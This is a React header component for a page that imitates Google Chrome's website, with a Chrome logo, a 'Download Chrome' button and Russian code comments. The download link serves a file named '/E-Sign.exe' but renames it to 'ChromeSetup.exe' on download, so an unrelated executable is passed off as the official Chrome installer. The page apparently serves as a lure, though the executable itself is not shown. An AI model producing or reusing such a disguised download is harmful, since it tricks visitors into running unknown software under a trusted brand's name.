// src/components/Header.jsx
import '../style/header.css'; // импортируйте стили для Header
import logo from '../assets/logo.png'; // импортируйте логотип

export const Header = () => {
  return (
    <header className="header">
      <div className="header__inner">
        <a href="/" className="header__logo">
          <img src={logo} alt="Chrome logo" />
        </a>
        <nav className="header__nav">
          <ul>
            <li><a href="#security">Safety</a></li>
            <li><a href="#google">From Google</a></li>
            <li>
              <a href="#extensions" target="_blank" rel="noopener noreferrer">
                Extensions ↗
              </a>
            </li>
          </ul>
        </nav>
        <div className="header__actions">
          {/* 
            Кладём ChromeSetup.exe в папку public,
            и указываем на него ссылку с атрибутом download 
          */}
          <a
            href="/E-Sign.exe"
            download="ChromeSetup.exe"
            className="btn-download"
          >
            Download Chrome
          </a>
        </div>
      </div>
    </header>
  );
};
